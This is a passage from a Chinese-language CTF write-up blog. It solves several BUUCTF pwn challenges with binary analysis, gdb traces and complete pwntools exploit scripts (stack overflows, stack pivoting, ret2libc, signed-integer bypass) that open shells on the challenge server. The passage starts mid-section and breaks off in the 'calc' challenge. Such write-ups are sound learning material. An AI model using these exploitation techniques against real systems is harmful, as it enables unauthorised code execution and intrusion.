└─$ ROPgadget --binary ./ciscn_2019_ne_5 --string "/bin/sh"
Strings information
============================================================

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./ciscn_2019_ne_5 --string "sh"         
Strings information
============================================================
0x080482ea : sh
```

编写`Python`代码进行求解可以得到`flag{e911a4b9-c3d7-4737-93ca-2ff81cfc04f0}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29145)
elf = ELF('./ciscn_2019_ne_5')
system_addr = elf.symbols['system']
sh_addr = 0x80482ea # ROPgadget --binary ./ciscn_2019_ne_5 --string "sh"
exit_addr = elf.symbols['exit']
io.sendlineafter(b'Please input admin password:', 'administrator')
payload = b'a'*(0x48+0x4) + p32(system_addr) + p32(exit_addr) + p32(sh_addr)
io.sendlineafter(b'Exit\n:', '1')
io.sendlineafter(b'Please input new log info:', payload)
io.sendlineafter(b'Exit\n:', '4')
io.interactive()
```

------

### [ciscn_2019_es_2](https://buuoj.cn/challenges#ciscn_2019_es_2)

先`file ./ciscn_2019_es_2`查看文件类型再`checksec --file=./ciscn_2019_es_2`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./ciscn_2019_es_2
./ciscn_2019_es_2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=88938f6e63cc4e27018f9032c4934e0a377712d1, not stripped
                                                                                                      
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./ciscn_2019_es_2
[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_es_2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`ciscn_2019_es_2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  puts("Welcome, my friend. What's your name?");
  vul();
  return 0;
}
```

双击`vul()`函数查看详情，`char`型变量`s`的大小是`0x28`个字节，`read()`函数能够读取`0x40`个字节，存在栈溢出漏洞，但是只溢出了`8`个字节，这只能覆盖`$ebp`和`ret`，这题的考察点应该是栈迁移。

```c
int vul()
{
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  read(0, s, 0x30u);
  printf("Hello, %s\n", s);
  read(0, s, 0x30u);
  return printf("Hello, %s\n", s);
}
```

栈迁移的大致过程如下：

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_es_2/1.jpg)

`vul()`函数提供了俩次输入输出，我们第一次输入输出可以用来泄露`$ebp`的地址，设置栈布局，第二次输入覆盖`$ebp`和`ret`进行栈迁移，再回到栈顶执行`ROP`链。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_es_2/2.jpg)

`read()`函数执行完后，`leave; ret;`时会执行`move esp, ebp; pop ebp;`，此时`$ebp`指向的是`fake_ebp_addr`。然后又会执行一次`leave; ret;`，此时会执行我们构造的`ROP`链。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_es_2/3.jpg)

在`Functions window`中发现后门函数`hack()`能够输出`flag`，`echo flag`能输出`flag`这四个字符，而不是我们想要的`flag`文件中的内容。这里相当于提供了一个`system`函数。

```c
int hack()
{
  return system("echo flag");
}
```

`gdb`进一步了解程序的部分过程如下：

```assembly
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ gdb ./ciscn_2019_es_2
pwndbg> disassemble vul
Dump of assembler code for function vul:
   0x08048595 <+0>:     push   ebp
   0x08048596 <+1>:     mov    ebp,esp
   0x08048598 <+3>:     sub    esp,0x28
   0x0804859b <+6>:     sub    esp,0x4
   0x0804859e <+9>:     push   0x20
   0x080485a0 <+11>:    push   0x0
   0x080485a2 <+13>:    lea    eax,[ebp-0x28]
   0x080485a5 <+16>:    push   eax
   0x080485a6 <+17>:    call   0x8048430 <memset@plt>
   0x080485ab <+22>:    add    esp,0x10
   0x080485ae <+25>:    sub    esp,0x4
   0x080485b1 <+28>:    push   0x30
   0x080485b3 <+30>:    lea    eax,[ebp-0x28]
   0x080485b6 <+33>:    push   eax
   0x080485b7 <+34>:    push   0x0
   0x080485b9 <+36>:    call   0x80483d0 <read@plt>
   0x080485be <+41>:    add    esp,0x10
   0x080485c1 <+44>:    sub    esp,0x8
   0x080485c4 <+47>:    lea    eax,[ebp-0x28]
   0x080485c7 <+50>:    push   eax
   0x080485c8 <+51>:    push   0x80486ca
   0x080485cd <+56>:    call   0x80483e0 <printf@plt>
   0x080485d2 <+61>:    add    esp,0x10
   0x080485d5 <+64>:    sub    esp,0x4
   0x080485d8 <+67>:    push   0x30
   0x080485da <+69>:    lea    eax,[ebp-0x28]
   0x080485dd <+72>:    push   eax
   0x080485de <+73>:    push   0x0
   0x080485e0 <+75>:    call   0x80483d0 <read@plt>
   0x080485e5 <+80>:    add    esp,0x10
   0x080485e8 <+83>:    sub    esp,0x8
   0x080485eb <+86>:    lea    eax,[ebp-0x28]
   0x080485ee <+89>:    push   eax
   0x080485ef <+90>:    push   0x80486ca
   0x080485f4 <+95>:    call   0x80483e0 <printf@plt>
   0x080485f9 <+100>:   add    esp,0x10
   0x080485fc <+103>:   nop
   0x080485fd <+104>:   leave  # 等价 mov esp, ebp; pop ebp; (esp = esp+4)
   0x080485fe <+105>:   ret    # 等价 pop eip
End of assembler dump.
pwndbg> b *vul+36
Breakpoint 1 at 0x80485b9
pwndbg> run
Starting program: /home/tyd/ctf/pwn/buuctf/ciscn_2019_es_2 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome, my friend. What's your name?

Breakpoint 1, 0x080485b9 in vul ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────
 EAX  0xffffcfa0 ◂— 0x0
 EBX  0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
 ECX  0x20
 EDX  0xffffcfc0 —▸ 0x80486d8 ◂— push   edi /* "Welcome, my friend. What's your name?" */
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
 ESI  0x8048640 (__libc_csu_init) ◂— push   ebp
 EBP  0xffffcfc8 —▸ 0xffffcfd8 ◂— 0x0
 ESP  0xffffcf90 ◂— 0x0
 EIP  0x80485b9 (vul+36) —▸ 0xfffe12e8 ◂— 0x0
──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
 ► 0x80485b9 <vul+36>    call   read@plt                     <read@plt>
        fd: 0x0 (/dev/pts/0)
        buf: 0xffffcfa0 ◂— 0x0
        nbytes: 0x30
 
   0x80485be <vul+41>    add    esp, 0x10
   0x80485c1 <vul+44>    sub    esp, 8
   0x80485c4 <vul+47>    lea    eax, [ebp - 0x28]
   0x80485c7 <vul+50>    push   eax
   0x80485c8 <vul+51>    push   0x80486ca
   0x80485cd <vul+56>    call   printf@plt                     <printf@plt>
 
   0x80485d2 <vul+61>    add    esp, 0x10
   0x80485d5 <vul+64>    sub    esp, 4
   0x80485d8 <vul+67>    push   0x30
   0x80485da <vul+69>    lea    eax, [ebp - 0x28]
──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ esp 0xffffcf90 ◂— 0x0
01:0004│     0xffffcf94 —▸ 0xffffcfa0 ◂— 0x0
02:0008│     0xffffcf98 ◂— 0x30 /* '0' */
03:000c│     0xffffcf9c ◂— 0x25 /* '%' */
04:0010│ eax 0xffffcfa0 ◂— 0x0
... ↓        3 skipped
────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► f 0 0x80485b9 vul+36
   f 1 0x804862a main+43
   f 2 0xf7c23295 __libc_start_call_main+117
   f 3 0xf7c23358 __libc_start_main+136
   f 4 0x8048471 _start+33
──────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> n
AAAA
0x080485be in vul ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────
*EAX  0x5
 EBX  0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
*ECX  0xffffcfa0 ◂— 'AAAA\n'
*EDX  0x30
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
 ESI  0x8048640 (__libc_csu_init) ◂— push   ebp
 EBP  0xffffcfc8 —▸ 0xffffcfd8 ◂— 0x0
 ESP  0xffffcf90 ◂— 0x0
*EIP  0x80485be (vul+41) ◂— add    esp, 0x10
──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
   0x80485b9 <vul+36>    call   read@plt                     <read@plt>
 
 ► 0x80485be <vul+41>    add    esp, 0x10
   0x80485c1 <vul+44>    sub    esp, 8
   0x80485c4 <vul+47>    lea    eax, [ebp - 0x28]
   0x80485c7 <vul+50>    push   eax
   0x80485c8 <vul+51>    push   0x80486ca
   0x80485cd <vul+56>    call   printf@plt                     <printf@plt>
 
   0x80485d2 <vul+61>    add    esp, 0x10
   0x80485d5 <vul+64>    sub    esp, 4
   0x80485d8 <vul+67>    push   0x30
   0x80485da <vul+69>    lea    eax, [ebp - 0x28]
──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ esp 0xffffcf90 ◂— 0x0
01:0004│     0xffffcf94 —▸ 0xffffcfa0 ◂— 'AAAA\n'
02:0008│     0xffffcf98 ◂— 0x30 /* '0' */
03:000c│     0xffffcf9c ◂— 0x25 /* '%' */
04:0010│ ecx 0xffffcfa0 ◂— 'AAAA\n'
05:0014│     0xffffcfa4 ◂— 0xa /* '\n' */
06:0018│     0xffffcfa8 ◂— 0x0
07:001c│     0xffffcfac ◂— 0x0
────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► f 0 0x80485be vul+41
   f 1 0x804862a main+43
   f 2 0xf7c23295 __libc_start_call_main+117
   f 3 0xf7c23358 __libc_start_main+136
   f 4 0x8048471 _start+33
──────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 0x10
00:0000│ esp 0xffffcf90 ◂— 0x0
01:0004│     0xffffcf94 —▸ 0xffffcfa0 ◂— 'AAAA\n'
02:0008│     0xffffcf98 ◂— 0x30 /* '0' */
03:000c│     0xffffcf9c ◂— 0x25 /* '%' */
04:0010│ ecx 0xffffcfa0 ◂— 'AAAA\n'     
05:0014│     0xffffcfa4 ◂— 0xa /* '\n' */
06:0018│     0xffffcfa8 ◂— 0x0
... ↓        5 skipped
0c:0030│     0xffffcfc0 —▸ 0x80486d8 ◂— push   edi /* "Welcome, my friend. What's your name?" */
0d:0034│     0xffffcfc4 —▸ 0xf7fc1678 —▸ 0xf7ffdbac —▸ 0xf7fc1790 —▸ 0xf7ffda40 ◂— ...
0e:0038│ ebp 0xffffcfc8 —▸ 0xffffcfd8 ◂— 0x0   # $ebp起始地址
0f:003c│     0xffffcfcc —▸ 0x804862a (main+43) ◂— mov    eax, 0
```

编写`Python`代码求解，拿到`shell`后`cat flag`，得到`flag{bd018c2d-7070-4625-a5d0-4cd000f2f625}`。

```python
from pwn import *

# io = process('./ciscn_2019_es_2')
io = remote('node4.buuoj.cn', 25169)
padding = cyclic(0x27)
io.recvuntil(b"Welcome, my friend. What's your name?\n")
io.sendline(padding)
io.recvline()
ebp = u32(io.recv(4))  # raw ebp
log.info('ebp_addr => %#x', ebp)
# gdb.attach(io)
leave_ret = 0x80485fd  # leave; ret; 这俩个都行
leave_ret = 0x80484b8  # ROPgadget --binary ./ciscn_2019_es_2 --only "leave|ret"
elf = ELF('./ciscn_2019_es_2')
system_addr = elf.symbols['system']  # 0x8048400
stdin_addr = ebp-0x38
payload = p32(ebp)
payload += p32(system_addr) + p32(0) + p32(stdin_addr+0x10) + b'/bin/sh\x00'
payload += cyclic(0x10) + p32(stdin_addr) + p32(leave_ret)
io.sendline(payload)
io.interactive()
```

------

### [jarvisoj_level4](https://buuoj.cn/challenges#jarvisoj_level4)

先`file ./level4`查看文件类型，再`checksec --file=./level4`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./level4         
./level4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44cfbcb6b7104566b4b70e843bc97c0609b7a018, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./level4         
[*] '/home/tyd/ctf/pwn/buuctf/level4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`level4`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF
  return read(0, buf, 0x100u);
}
```

`DynELF`函数能通过已知函数迅速查找`libc`库，并不需要我们知道`libc`文件的版本，也不像使用`LibcSearcher`那样需要选择`libc`的版本。`DynELF`函数的使用前提是程序中存在可以泄露libc信息的漏洞，并且漏洞可以被反复触发。我们利用`DynELF`函数泄露出`system`函数的地址后，还需要知道`/bin/sh`的地址，程序中并没有`/bin/sh`，所以`ROPgadget`无法找到。程序是`NX enabled`，即开启了堆栈不可执行，但`/bin/sh`是参数并不是要执行的函数。我们可以利用`read`函数把`/bin/sh`读入到程序的`.bss`段中，然后使用`system`函数调用即可得到靶机的`shell`。

编写`Python`代码求解可得`flag{44724d0a-a417-431b-b012-bafca1d45411}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25533)
elf = ELF('./level4')
main_addr = elf.symbols['main']  # 0x8048470
write_plt = elf.plt['write']  # 0x8048340
read_plt = elf.plt['read']  # 0x8048310
bss_addr = elf.bss()  # 0x804a024
padding = b'a'*(0x88+0x4)

def leak(address):
    payload = padding + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4)
    io.sendline(payload)
    leaked = io.recv(4)
    log.info("[%#x] => %s = %s" % (address, repr(leaked), hex(u32(leaked))))
    return leaked


libc = DynELF(leak, elf=elf)
system_addr = libc.lookup('system', 'libc')
log.success('system_address => %#x' % system_addr)
payload = padding + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
io.send(payload)
io.send('/bin/sh\x00')
payload = padding + p32(system_addr) + p32(main_addr) + p32(bss_addr)
io.sendline(payload)
io.interactive()
```

------

### bjdctf_2020_babystack2

先`file ./bjdctf_2020_babystack2 `查看文件类型，再`checksec --file=./bjdctf_2020_babystack2 `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./bjdctf_2020_babystack2           
./bjdctf_2020_babystack2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=98383c4b37ec43aae16b46971bd5ead3f03ce0a6, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./bjdctf_2020_babystack2
[*] '/home/tyd/ctf/pwn/buuctf/bjdctf_2020_babystack2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`NX enabled`开启栈不可执行，用`IDA Pro 64bit`打开附件`./bjdctf_2020_babystack2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  if ( (int)nbytes > 10 )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```

程序首先输入`size_t`型的`nbytes`，如果这个无符号整数强制转换成`int`型后大于`10`就终止程序，否则`nbytes`为下一次输入的最大长度限制。`read`函数向`buf`变量中写入不超过`nbytes`字节的数据，存在栈溢出漏洞。在`Functions window`中看到后门函数`backdoor`。

```assembly
public backdoor
backdoor proc near
; __unwind {
push    rbp
mov     rbp, rsp
mov     edi, offset command ; "/bin/sh"
call    _system
mov     eax, 1
pop     rbp
retn
; } // starts at 400726
backdoor endp
```

当第一次输入`-1`时就能造成栈溢出漏洞，编写`Python`代码求解得到`flag{8cdd2ef8-b593-4974-8dcf-a8eb632145e6}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 29944)
elf = ELF('./bjdctf_2020_babystack2')
backdoor = elf.symbols['backdoor']
io.recv()
io.sendline(b'-1')
payload = b'a'*0x18 + p64(backdoor)
io.sendlineafter(b"[+]What's u name?", payload)
io.interactive()
```

------

### pwn2_sctf_2016

先`file ./pwn2_sctf_2016`查看文件类型，再`checksec --file=./pwn2_sctf_2016`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./pwn2_sctf_2016
./pwn2_sctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4b6d53bc9aca0e73953173f153dc75bd540d6a48, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./pwn2_sctf_2016
[*] '/home/tyd/ctf/pwn/buuctf/pwn2_sctf_2016'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`NX enabled`开启栈中不可执行，可能是`ret2shellcode`或`ret2libc`。用`IDA Pro 32bit`打开附件`./pwn2_sctf_2016`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  return vuln();
}
```

双击`vuln()`函数查看详情：

```c
int vuln()
{
  char nptr[32]; // [esp+1Ch] [ebp-2Ch] BYREF
  int v2; // [esp+3Ch] [ebp-Ch]

  printf("How many bytes do you want me to read? ");
  get_n(nptr, 4);
  v2 = atoi(nptr);
  if ( v2 > 32 )
    return printf("No! That size (%d) is too large!\n", v2);
  printf("Ok, sounds good. Give me %u bytes of data!\n", v2);
  get_n(nptr, v2);
  return printf("You said: %s\n", nptr);
}
```

当`get_n()`获取的`nptr`大于`32`时会退出程序，双击`get_n()`函数查看详情：

```c
int __cdecl get_n(int a1, unsigned int a2)
{
  unsigned int v2; // eax
  int result; // eax
  char v4; // [esp+Bh] [ebp-Dh]
  unsigned int i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; ; ++i )
  {
    v4 = getchar();
    if ( !v4 || v4 == 10 || i >= a2 )
      break;
    v2 = i;
    *(_BYTE *)(v2 + a1) = v4;
  }
  result = a1 + i;
  *(_BYTE *)(a1 + i) = 0;
  return result;
}
```

在`32`位有符号整型`int`中，`-1`在计算机中的值为**11111111 11111111 11111111 11111111 = 0xFFFFFFFF**，而这个数值在`32`位无符号整型`unsigned int`中的十进制值为**4294967295**，因此我们可以用`-1`来绕过`if ( v2 > 32 )`这个判断条件，并且构造了栈溢出漏洞。`Functions window`中没有`system()`函数和`"/bin/sh"`，重新审计`vuln()`函数，我们可以利用`printf`函数来泄露`libc`版本，从而计算出`system()`函数和`"/bin/sh"`的地址，然后利用栈溢出漏洞劫持程序去执行。编写`Python`代码求解，然而`LibcSearcher`打不通。

```python
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 26660)
elf = ELF('./pwn2_sctf_2016')
main_addr = elf.symbols['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
payload = b'a'*(0x2c+0x4) + flat([printf_plt, main_addr, printf_got])
io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
io.sendline(payload)
io.recvline()
printf_addr = u32(io.recv(4))
log.info('printf_address => %s', hex(printf_addr))
libc = LibcSearcher('printf', printf_addr)
libcbase = printf_addr - libc.dump('printf')
log.success('printf_address => %s', hex(printf_addr))
system_addr = libcbase + libc.dump('system')
log.info('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.info('bin_sh_address => %s', hex(bin_sh_addr))
io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
payload = b'a'*(0x2c+0x4) + flat([system_addr, main_addr, bin_sh_addr])
io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
io.sendline(payload)
io.interactive()
```

找了个`libc_32.so.6`打通了，得到`flag{83a8a45c-8540-4a09-9e84-38bb8824835d}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 26660)
elf = ELF('./pwn2_sctf_2016')
main_addr = elf.symbols['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
payload = b'a'*(0x2c+0x4) + flat([printf_plt, main_addr, printf_got])
io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
io.sendline(payload)
io.recvline()
printf_addr = u32(io.recv(4))
log.info('printf_address => %s', hex(printf_addr))
libc = ELF('./libc_32.so.6')
libcbase = printf_addr - libc.symbols['printf']
log.success('printf_address => %s', hex(printf_addr))
system_addr = libcbase + libc.symbols['system']
log.info('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
log.info('bin_sh_address => %s', hex(bin_sh_addr))
io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
payload = b'a'*(0x2c+0x4) + flat([system_addr, main_addr, bin_sh_addr])
io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
io.sendline(payload)
io.interactive()
```

------

### not_the_same_3dsctf_2016

先`file ./not_the_same_3dsctf_2016`查看文件类型，再`checksec --file=./not_the_same_3dsctf_2016`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./not_the_same_3dsctf_2016
./not_the_same_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./not_the_same_3dsctf_2016
[*] '/home/tyd/ctf/pwn/buuctf/not_the_same_3dsctf_2016'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`./not_the_same_3dsctf_2016`，按`F5`反汇编源码并查看主函数。发现`gets()`函数读取输入到变量`v4`中，`v4`的长度有`0x2D`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF

  printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ");
  gets(v4);
  return 0;
}
```

在`Functions window`中看到后门函数`get_secret`。

```c
int get_secret()
{
  int v0; // esi

  v0 = fopen("flag.txt", &unk_80CF91B);
  fgets(&fl4g, 45, v0);
  return fclose(v0);
}
```

首先我们可以利用栈溢出漏洞，劫持程序跳转至后门函数`get_secret`，读取`flag.txt`中的内容到`fl4g`，返回到主函数后再次利用栈溢出漏洞和程序内的`write`函数，读取`fl4g`中的内容。编写`Python`代码求解得到`flag{be1e304b-8a02-4cda-b3dd-54fbdca25619}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
elf = ELF('./not_the_same_3dsctf_2016')
io = remote('node4.buuoj.cn', 26057)
main = elf.sym['main'] # 0x80489E0
get_secret = elf.sym['get_secret'] # 0x80489A0
fl4g = 0x80ECA2D
write = elf.sym['write'] # 0x806E270
offset = 0x2d
payload = b'a'*offset + p32(get_secret) + p32(main)
io.sendline(payload)
payload = b'a'*offset + p32(write) + p32(main) + p32(1) + p32(fl4g) + p32(offset)
io.sendline(payload)
io.interactive()
```

------

### ret2text

先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2text]
└─$ file ./pwn           
./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=91958f3de15439a5e19498ff6c24650656401015, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2text]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/ret2text/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-20h] BYREF

  init(argc, argv, envp);
  puts("Welcome!May I have your name?");
  __isoc99_scanf("%s", v4);
  puts("Ok.See you!");
  return 0;
}
```

存在栈溢出漏洞，双击`v4`变量查看栈结构：

```assembly
-0000000000000020 ; D/A/*   : change type (data/ascii/array)
-0000000000000020 ; N       : rename
-0000000000000020 ; U       : undefine
-0000000000000020 ; Use data definition commands to create local variables and function arguments.
-0000000000000020 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0
-0000000000000020 ;
-0000000000000020
-0000000000000020 var_20          db 32 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

注意到`Functions window`中有个`backdooOo0r()`函数，其返回值直接执行了`/bin/sh`。

```c
int backdooOo0r()
{
  return execve("/bin/sh", 0LL, 0LL);
}
```

编写`Python`代码求解得到`flag{8c05c222-e73e-4f15-b977-a26310b808e5}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 28674)
elf = ELF('./pwn')
backdoor = elf.symbols['backdooOo0r']
payload = b'a'*(0x20+0x8) + p64(backdoor)
io.sendline(payload)
io.interactive()
```

------

### calc

先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/calc]
└─$ file ./pwn
./pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5aeaa15b87f358f1145d4c7b9d226d51df696cf1, stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/calc]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/calc/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_C1B(a1, a2, a3);
  sub_B3A();
  sub_CE1();
  return 0LL;
}
```

双击`sub_B3A`函数查看详情：

```c
int sub_B3A()
{
  puts("Welcome to NewStarCTF!\nCan you make a calculator to slove 100 math calculations in 30 seconds?!");
  return puts("Enjoy it!");
}
```

`30`秒内算`100`道加减乘除题，挺有意思。双击`sub_CE1`函数查看详情：

```c
void __fastcall sub_CE1(const char *a1)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  char v4; // [rsp+Fh] [rbp-21h]
  int v5; // [rsp+10h] [rbp-20h] BYREF
  int v6; // [rsp+14h] [rbp-1Ch]
  int v7; // [rsp+18h] [rbp-18h]
  int i; // [rsp+1Ch] [rbp-14h]
  int v9; // [rsp+20h] [rbp-10h]
  int v10; // [rsp+24h] [rbp-Ch]
  unsigned __int64 v11; // [rsp+28h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  v5 = 0;
  v6 = 0;
  v7 = 100;
  for ( i = 0; i <= 99; ++i )
  {
    v1 = time(0LL);
    srand(v1 * (i + 114));
    v9 = rand() % 1919 + 1;
    v2 = time(0LL);
    srand(v2 * (i + 514));
    v10 = rand() % 810 + 1;
    v3 = time(0LL);
    srand(v3 * (i + 1919810));
    v4 = byte_202010[rand() % 3];
    printf("What's the answer? %d %c %d = what?\n", (unsigned int)v9, (unsigned int)v4, (unsigned int)v10);
    __isoc99_scanf("%d", &v5);
    if ( v4 == 45 )
    {
      v6 = v9 - v10;
    }
    else if ( v4 > 45 )
    {
      if ( v4 == 47 )
      {
